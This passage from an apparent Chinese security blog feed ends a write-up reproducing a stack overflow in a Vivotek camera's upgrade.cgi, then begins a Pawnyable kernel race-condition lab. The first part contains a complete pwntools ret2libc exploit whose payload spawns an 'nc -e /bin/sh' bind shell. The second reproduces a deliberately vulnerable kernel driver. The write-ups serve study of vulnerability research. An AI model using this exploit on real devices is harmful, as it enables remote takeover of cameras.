src="/EXP_FILE/e75d1d37c5e7e83c0b45bfecd136e7be_MD5.jpeg"><br>可见$pc寄存器被覆盖为非法地址，服务崩溃，存在栈溢出漏洞</p><h1 id="三、EXP"><a href="#三、EXP" class="headerlink" title="三、EXP"></a>三、EXP</h1><p>开了NX，ret2libc或许是个可用的选择，但前提是vivotek实体机上没有开aslr，否则的话还是要先泄露libc基址。考虑到IoT设备为效率考虑一般是不会开aslr的，所以这边直接通过ret2libc来进行利用。</p><p>先在qemu的arm-debian虚拟机中关闭aslr：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过测试，溢出长度为0x38正好能覆盖到$pc<br><img src="/EXP_FILE/2d2c991180390fb3c52cbf5c44fad401_MD5.jpeg"></p><p>获得libc基址和程序崩溃时$sp的值：<br><img src="/EXP_FILE/1c9f71e62672340fe79bedb27cf13755_MD5.jpeg"><br><img src="/EXP_FILE/2d2c991180390fb3c52cbf5c44fad401_MD5.jpeg"></p><blockquote><p>利用时有一点要注意，溢出是通过<code>strncpy</code>函数实现的，要避免00截断。因此我选择使用libc中的gadget。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token number">0xb6f2d000</span>stack<span class="token operator">=</span><span class="token number">0xbeffeb00</span>r1_pc<span class="token operator">=</span><span class="token number">0x00048784</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressmov_r0_r1_pp_pc<span class="token operator">=</span><span class="token number">0x00016aa4</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressshell<span class="token operator">=</span>stack<span class="token operator">+</span><span class="token number">0x14</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>cyclic<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>r1_pc<span class="token punctuation">,</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>mov_r0_r1_pp_pc<span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">,</span><span class="token string">b'bbbb'</span><span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token string">b'nc -l -p 4444 -e /bin/sh; '</span>head<span class="token operator">=</span><span class="token string">b'POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:'</span>end<span class="token operator">=</span><span class="token string">b'\n\r\n\r\n'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>head<span class="token operator">+</span>payload<span class="token operator">+</span>end<span class="token punctuation">)</span><span class="token comment">#itr()</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>binary<span class="token operator">=</span><span class="token string">'./httpd'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libuClibc-0.9.33.3-git.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'192.168.2.2'</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功弹shell：<br><img src="/EXP_FILE/cb5d17269d22b79db45038f9f002a06b_MD5.jpeg"></p><h1 id="四、杂谈"><a href="#四、杂谈" class="headerlink" title="四、杂谈"></a>四、杂谈</h1><p>这个漏洞本身并不复杂，只是一个栈溢出，但是在iot环境下又显得那么与众不同。这是我第一次接触iot漏洞的复现，也踩了不少坑，不过仍然收获满满。</p>]]></content>
      
      
      <categories>
          
          <category> IoT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-4 Holstein v4 竞态条件</title>
      <link href="/2024/02/11/LK01-4%20Holstein%20v4%20%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6/"/>
      <url>/2024/02/11/LK01-4%20Holstein%20v4%20%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v4 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">int</span> mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>mutex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"resource is busy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"invalid buffer size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>版本5.16.14</p><h1 id="一、LK01-4-Holstein-v4"><a href="#一、LK01-4-Holstein-v4" class="headerlink" title="一、LK01-4 Holstein v4"></a>一、LK01-4 Holstein v4</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v4 (KL01-4) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">2</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了smap、smep、kpti、kaslr<br>值得注意的是，-smp 2 将虚拟机设置为2核CPU</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>什么保护都没有</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">49</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./vuln.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" 